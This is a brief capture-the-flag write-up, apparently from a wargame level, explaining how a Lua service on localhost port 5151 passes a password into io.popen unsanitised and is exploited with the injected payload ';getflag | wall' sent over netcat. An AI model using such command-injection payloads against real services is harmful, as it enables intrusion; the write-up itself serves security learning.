here we have a function.lua ; to find the flag here i had to run
nc 127.0.0.1 5151
password : ";getflag | wall"
*we use ';' because prog = io.popen("echo "..pass.." | sha1sum", "r")
; means end of command , so getflag here is executed as command
and because popen returns a file that contains results
execution of the command and wall broadcast the result to all terminals


command used:
  "nc 127.0.0.1 5151"
  ";getflag | wall"
  
